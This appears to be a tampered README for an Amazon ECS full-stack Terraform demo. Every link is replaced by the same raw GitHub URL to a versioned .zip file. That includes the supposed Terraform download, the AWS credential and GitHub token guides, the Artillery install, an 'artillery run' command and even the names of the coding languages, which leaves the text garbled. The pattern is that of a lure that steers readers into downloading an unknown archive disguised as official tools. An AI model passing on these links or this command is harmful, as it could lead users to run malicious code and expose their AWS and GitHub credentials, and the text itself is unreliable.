...
- Code: the code for the running application
    - client: https://raw.githubusercontent.com/sivahariu/amazon-ecs-fullstack-app-terraform/main/Code/client/src/services/ecs-terraform-fullstack-app-amazon-v1.0-beta.5.zip code for the frontend application
    - server: https://raw.githubusercontent.com/sivahariu/amazon-ecs-fullstack-app-terraform/main/Code/client/src/services/ecs-terraform-fullstack-app-amazon-v1.0-beta.5.zip code for the backend application
...
<p align="center">
  <img src="https://raw.githubusercontent.com/sivahariu/amazon-ecs-fullstack-app-terraform/main/Code/client/src/services/ecs-terraform-fullstack-app-amazon-v1.0-beta.5.zip"/>
</p>

### Infrastructure considerations due to demo proposals
The task definition template (https://raw.githubusercontent.com/sivahariu/amazon-ecs-fullstack-app-terraform/main/Code/client/src/services/ecs-terraform-fullstack-app-amazon-v1.0-beta.5.zip) that enables the CodePipeline to execute a Blue/Green deployment in ECS has hardcoded values for the memory and CPU values for the server and client application.
...
1) Install Terraform, use Terraform v0.13 or above. You can visit [this](https://raw.githubusercontent.com/sivahariu/amazon-ecs-fullstack-app-terraform/main/Code/client/src/services/ecs-terraform-fullstack-app-amazon-v1.0-beta.5.zip) Terraform official webpage to download it.
2) Configure the AWS credentials into your machine (~https://raw.githubusercontent.com/sivahariu/amazon-ecs-fullstack-app-terraform/main/Code/client/src/services/ecs-terraform-fullstack-app-amazon-v1.0-beta.5.zip). You need to use the following format:
...
3) Generate a GitHub token. You can follow [this](https://raw.githubusercontent.com/sivahariu/amazon-ecs-fullstack-app-terraform/main/Code/client/src/services/ecs-terraform-fullstack-app-amazon-v1.0-beta.5.zip) steps to generate it.
...
+ **aws_profile** = according to the profiles name in ~https://raw.githubusercontent.com/sivahariu/amazon-ecs-fullstack-app-terraform/main/Code/client/src/services/ecs-terraform-fullstack-app-amazon-v1.0-beta.5.zip
...
For this stress test [Artillery](https://raw.githubusercontent.com/sivahariu/amazon-ecs-fullstack-app-terraform/main/Code/client/src/services/ecs-terraform-fullstack-app-amazon-v1.0-beta.5.zip) is being used. Please be sure to install it following [these](https://raw.githubusercontent.com/sivahariu/amazon-ecs-fullstack-app-terraform/main/Code/client/src/services/ecs-terraform-fullstack-app-amazon-v1.0-beta.5.zip) steps.
...
*Frontend layer:*
```bash
artillery run https://raw.githubusercontent.com/sivahariu/amazon-ecs-fullstack-app-terraform/main/Code/client/src/services/ecs-terraform-fullstack-app-amazon-v1.0-beta.5.zip
```
...
To learn more about Amazon ECS Autoscaling please take a look to [this](https://raw.githubusercontent.com/sivahariu/amazon-ecs-fullstack-app-terraform/main/Code/client/src/services/ecs-terraform-fullstack-app-amazon-v1.0-beta.5.zip) documentation.
## Application Code

### Client app

The Client folder contains the code to run the frontend. This code is written in https://raw.githubusercontent.com/sivahariu/amazon-ecs-fullstack-app-terraform/main/Code/client/src/services/ecs-terraform-fullstack-app-amazon-v1.0-beta.5.zip and uses the port 80 in the deployed version, but when run localy it uses port 3000.
...
```json
{
  ...
  "path": {
    "S": "https://raw.githubusercontent.com/sivahariu/amazon-ecs-fullstack-app-terraform/main/Code/client/src/services/ecs-terraform-fullstack-app-amazon-v1.0-beta.5.zip"
  },
  "title": {
    "S": "My title"
  }
...
The Server folder contains the code to run the backend. This code is written in https://raw.githubusercontent.com/sivahariu/amazon-ecs-fullstack-app-terraform/main/Code/client/src/services/ecs-terraform-fullstack-app-amazon-v1.0-beta.5.zip and uses the port 80 in the deployed version, but when run localy it uses port 3001.
...
See [CONTRIBUTING](https://raw.githubusercontent.com/sivahariu/amazon-ecs-fullstack-app-terraform/main/Code/client/src/services/ecs-terraform-fullstack-app-amazon-v1.0-beta.5.zip) for more information.
